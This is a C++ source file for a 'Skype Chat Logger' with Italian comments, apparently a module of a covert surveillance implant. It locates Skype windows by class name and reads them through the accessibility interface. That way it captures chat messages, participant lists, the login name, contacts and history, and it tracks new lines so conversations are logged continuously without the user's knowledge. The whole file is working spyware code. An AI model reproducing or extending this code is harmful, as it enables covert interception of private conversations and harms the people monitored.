/*
* Skype Chat Logger
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <exception>
using namespace std;

#include "QSkype3.h"
#include "QSkype2.h"
#include "..\HM_SafeProcedures.h"

// Skype chat tree
PWCHAR QSkype3::wChatTree[] = {
	L"TskMultiChatForm.UnicodeClass",
	L"TChatBackground",
	L"TPanel",
	L"TPanel",
	L"TChatContentControl",
	0
};

// Skype userlist
PWCHAR QSkype3::wChatUserListTree[] = {
	L"TskMultiChatForm.UnicodeClass",
	L"TChatBackground",
	L"TChatUserList",
	0
};

// Skype login name
PWCHAR QSkype3::wLoginTree[] = {
	L"tSkMainForm.UnicodeClass",
	0
};

// Skype contacts tree
PWCHAR QSkype3::wContactTree[] = {
	L"tSkMainForm.UnicodeClass",
	L"TPanel",
	L"TPanel",
	L"TSkypeTabControl",
	L"TMainUserList",
	0
};

// Skype history list
PWCHAR QSkype3::wHistoryTree[] = {
	L"tSkMainForm.UnicodeClass",
	L"TPanel",
	L"TPanel",
	L"TSkypeTabControl",
	L"THistoryList",
	0
};

QSkype3::QSkype3(const HWND hw) : QSkype2(hw)
{
	WCHAR wTopic[256] = {0};

	hwChat =  ole.GetHandleFromClass(wChatTree);
	hwUserList = ole.GetHandleFromClass(wChatUserListTree);
	hwLogin = ole.GetHandleFromClass(wLoginTree); 
	hwContacts = ole.GetHandleFromClass(wContactTree);
	hwHistory = ole.GetHandleFromClass(wHistoryTree);

	if(HM_SafeGetWindowTextW(hw, wTopic, 256))
		properties.SetId(wTopic);
	else
		properties.SetId(L"");

	//GrabUserList();

	//ole.SetHandle(hw);
	//properties.SetUpdated(TRUE);
}

QSkype3::~QSkype3()
{

}

BOOL QSkype3::GrabHistory() {
	LONG uLines, i, uIndex;
	BSTR bChat = NULL;

	if(!IsWindow(ole.GetHandle()))
		return FALSE;

	if(hwChat == NULL)
		return FALSE;

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	if(ole.SetInterfaceFromType(ROLE_SYSTEM_LISTITEM, 0) == FALSE){
		ole.Clean();
		return FALSE;
	}

	uIndex = uLines = ole.GetInterfaceChildrenCount();

	if(uLines == -1){
		ole.Clean();
		return FALSE;
	}

	// Se e' il primo grab di questo oggetto, prendi solo l'ultima
	// riga, in questo modo skippiamo tutta la history precedente.
	if(bFirstGrab){
		if(ole.GetLineFromContainer(&bChat, ole.GetInterfaceChildrenCount()) == FALSE || bChat == NULL){
			SysFreeString(bChat);
			properties.SetUpdated(FALSE);
			ole.Clean();
			return FALSE;
		}

		if(properties.SetHistory(bChat)){
			properties.SetUpdated(TRUE);
		}

		SysFreeString(bChat);
		bFirstGrab = FALSE;
		ole.Clean();
		return TRUE;
	}
	
	// Se siamo qui, non e' il primo grab
	// Pulisci la history se e' gia' stata acquisita
	if(properties.GetAcquiredStatus()){
		properties.CleanHistory();

		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		for(i = uLines; i > 0; i--){
			if(ole.GetLineFromContainer(&bChat, i) == FALSE || bChat == NULL){
				ole.Clean();
				return FALSE;
			}

			if(properties.CompareLastLine(bChat)){
				uIndex = ++i;
				break;
			}

			SysFreeString(bChat);
			bChat = NULL;
		}

		SysFreeString(bChat);
		bChat = NULL;

		// Se c'e' qualche riga da acquisire, possiamo cancellare la history
		if(uIndex <= uLines)
			properties.ClearHistory();

		// Se i e' uguale a uLines, non ci sono nuove righe, quindi torniamo
		for(i = uIndex; i <= uLines; i++){
			if(ole.GetLineFromContainer(&bChat, i) == FALSE || bChat == NULL){
				ole.Clean();
				return FALSE;
			}

			if(properties.AppendHistory(bChat))
				properties.SetUpdated(TRUE);

			SysFreeString(bChat);
			bChat = NULL;
		}
	}else{ // Parti dall'ultima riga e confronta
		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		for(i = uLines; i > 0; i--){
			if(ole.GetLineFromContainer(&bChat, i) == FALSE || bChat == NULL){
				ole.Clean();
				return FALSE;
			}

			if(properties.CompareLastLine(bChat)){
				uIndex = ++i;
				break;
			}

			SysFreeString(bChat);
			bChat = NULL;
		}

		SysFreeString(bChat);
		bChat = NULL;

		for(i = uIndex; i <= uLines; i++){
			if(ole.GetLineFromContainer(&bChat, i) == FALSE || bChat == NULL){
				ole.Clean();
				return FALSE;
			}

			if(properties.AppendHistory(bChat))
				properties.SetUpdated(TRUE);

			SysFreeString(bChat);
			bChat = NULL;
		}
	}

	ole.Clean();
	return TRUE;
}

BOOL QSkype3::GrabTopic() {
	WCHAR wTitle[256] = {0};

	if(properties.GetHandle() == NULL)
		return FALSE;

	if(HM_SafeGetWindowTextW(properties.GetHandle(), wTitle, 256))
		return properties.SetId(wTitle);
	else
		return properties.SetId(L"");
}

// Questo metodo va chiamato una sola volta per finestra e prima di
// chiamare la GrabChat().
BOOL QSkype3::GrabUserList() {
	UINT uLen, i;
	BSTR bUser = NULL;
	BOOL bRes;

	if(!IsWindow(ole.GetHandle())){
		properties.SetUsers(L"");
		return FALSE;
	}

	ole.SetHandle(hwUserList);

	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	if(ole.SetInterfaceFromType(ROLE_SYSTEM_LISTITEM, 0) == FALSE){
		ole.Clean();
		return FALSE;
	}

	uLen = ole.GetInterfaceChildrenCount();

	properties.ClearUsersList();

	for(i = 1; i <= uLen; i++){
		if(ole.GetValueFromContainer(&bUser, i) == FALSE || bUser == NULL){
			ole.Clean();
			return FALSE;
		}

		if(i < uLen)
			bRes = properties.AppendUser(bUser, TRUE);
		else
			bRes = properties.AppendUser(bUser, FALSE);

		SysFreeString(bUser);
		bUser = NULL;

		if(bRes == FALSE){
			ole.Clean();
			return FALSE;
		}
	}

	ole.Clean();
	return TRUE;
}

